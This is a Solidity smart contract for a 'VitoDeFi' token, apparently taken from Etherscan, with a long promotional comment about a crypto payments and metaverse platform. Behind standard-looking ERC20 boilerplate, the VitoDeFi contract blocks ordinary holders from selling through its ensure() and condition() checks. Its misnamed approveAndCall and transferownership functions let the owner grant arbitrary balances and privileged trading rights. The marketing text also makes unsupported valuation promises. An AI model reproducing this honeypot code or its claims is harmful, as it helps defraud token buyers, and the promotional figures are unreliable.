/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

/*
L2 & DeFi.
In your hand.
Vito DeFi is a mobile app that supports Ethereum scaling solutions (L2), Ledger devices, and DeFi.


Mobile
Send/swap tokens and perform DeFi actions even when you're not around your laptop.

Multichain
Vito supports many Ethereum scaling solutions, such as sidechains and rollups.

DeFi
Vito aims to support all the major DeFi (decentralized finance) protocols.

Ledger Nano
Connect Vito with your Ledger Nano S or X hardware wallet for increased security.





What is VITO?
VITO Coin is at the heart of global payments and digital banking platform that aims to allow hundreds of millions of retail users, institutions, merchants, vendors, and ecosystem partners to participate easily in the crypto economy with instant conversions between digital and fiat currencies. Through the upcoming virtual banking services and payment apps, all major crypto assets supported by the platform will become instantly liquid, and available across tens of millions of locations and online sites around the world. By 2024, VITO plans to also introduce a regulated platform to trade digital shares of most publicly held companies, as well as cryptocurrencies.

Although VITO’s primary objective is to capitalize on its crypto payment and virtual banking capabilities in the conventional world, we are building our technology and product base in anticipation of a fully functioning and heavily populated metaverse in the near future. The project aims to provide all of its banking and defi products and functions in the metaverse, in addition to being a leader in retail and commercial payments. Consequently, this applies to as many types of compliant DeFi products and services as possible across as many legal jurisdictions as possible.

In the near future, VITO intends to invest in and form long-term partnerships, joint ventures and alliances with content developers in the fields of sports, gambling, gaming, and other entertainment. A goal of this project is to be involved in the creation of popular metaverse destinations that are serviced exclusively by our payments and financial platforms. Content creation will also be a significant component of our soon to be announced Siberia blockchain protocol.



CAPITALIZE
Capitalize on our global crypto payments and virtual banking platforms for consumers and SMEs

INVEST IN
Forming long-term partnerships, joint ventures, and strategic alliances, and expanding our technology base

GLOBAL
Global payments and digital banking

METAVERSE
Developing leading edge payments capabilities, and developing metaverse content through joint ventures and alliances




Revolutionizing Cross-Border Payments with VITO token:


1. Lower Transaction Costs
If you are used to sending money overseas, you very well know how expensive the transactions can get. Banks in different countries do not always have direct relationships, and that means they often turn to intermediary financial institutions to facilitate indirect transfers. Intermediary banks charge fees for their services, which are deducted from the total transfer amount, along with the monies charged by the sending and receiving banks. The World Bank places the average total cost of remittances at 7% of the funds transferred.

The primary selling feature for VITO token is that it does not need any intermediaries to move from one point to the next. VITO token exists and is managed by an autonomous, decentralized ledger called the blockchain, which executes and records transactions among members of the network in near, real-time.
Eliminating third-party facilitators can reduce the fees involved in cross-border payments dramatically. Rather than giving banks at the sending, middle, and receiving points of the process a chunk of the funds in transit, crypto users would only pay the charges levied by the operator of the decentralized ledger technology.
PayPal is another case in point. The service has greatly redefined cross-border transactions but suffers from a number of challenges especially on the consumer side. The high transaction fees charged by PayPal and shockingly bad customer service are some of the problems faced by customers.

PayPal's market cap stands at $127 billion. With $34 billion in debt added, gives an enterprise value of $161 billion, equal to $560 per active customer, for 286 million customers, which grew by 10 million in 2019 Q4 alone.

The opportunity for VITO is obvious, and this is based on just one competitor. 10% of PayPal's business alone drives $110 into the value of each VITO token.

VITO’s key advantages will include:

• Instant settlements for merchants and consumers alike. No annoying holds on funds.
• Vastly superior customer service.
• Fees a fraction of those charged by PayPal.
• Ease of use for mobile payments.
• Better security.
• Ability to transact globally, and instantly.
With sufficient long-term marketing spend; VITO will build its merchant relationships into the many millions. PayPal currently deals with 22 million merchants globally. Merchant adoption is a key driver to consumer use. Build the merchant base, the consumer follows.

2. Faster Payments
A McKinsey survey reveals that cross-border payments can take between three and five days to complete, and sometimes more if multiple intermediaries are involved. Moreover, to settle each currency leg, funds need to be transferred through the sending and receiving banks’ domestic payment systems, whose operating hours can vary across international time zones.

The VITO token system eliminates third parties and ensures money goes straight to their recipients, saving a great deal of time. Once a payment is initiated on a blockchain network, the cryptographic validation process called hashing begins, lasting a few seconds, after which the receiving party can instantly access the funds.
The Ripple blockchain, on which the firm's cryptocoin XRP runs, boasts transaction times of as little as two seconds. On the Ethereum blockchain, Ether can be transferred within 15 seconds to four minutes. Even the Bitcoin blockchain, the oldest of the bunch, can confirm transactions within six minutes at its fastest and two hours at its slowest.

The point is, with cryptocurrencies, waiting days to receive cross-border payments can be a thing of the past.


3. Enhanced Security
Current cross-border models involve multiple parties to complete payments, most of which have their security problems and different standards to deal with them. The numerous touchpoints create an array of opportunities for cybercriminals to exploit, and the lack of cooperation among institutions makes it less likely for an effective security practice to be applied by everyone involved in a transaction.

The damaging Bangladesh Bank heist in 2016 saw criminals use credentials acquired from the country’s central bank to siphon $101 million via SWIFT. Such an incident is virtually impossible in a blockchain-based cross-border payments system. VITO network is decentralized and distributed across peer-to-peer connections and is synced across all devices at once. Therefore, the network does not have a single point of failure, and it cannot be altered from a single computer.

VITO records on a cross-border blockchain would also be secured via cryptography, Senders and receivers would have unique keys assigned to the transactions they make, and any alteration to the transaction records would render the key used invalid. Any malicious activity would, therefore, be immediately identified and halted.


4. Improved Transparency
One of the primary drivers of time and monetary losses in today’s cross-border payment structures is the verification process. Before funds can move from one account to another across the world, the banks involved must perform a series of verifications to validate the payment, a process that causes delays and requires resources.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract VitoDeFi {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}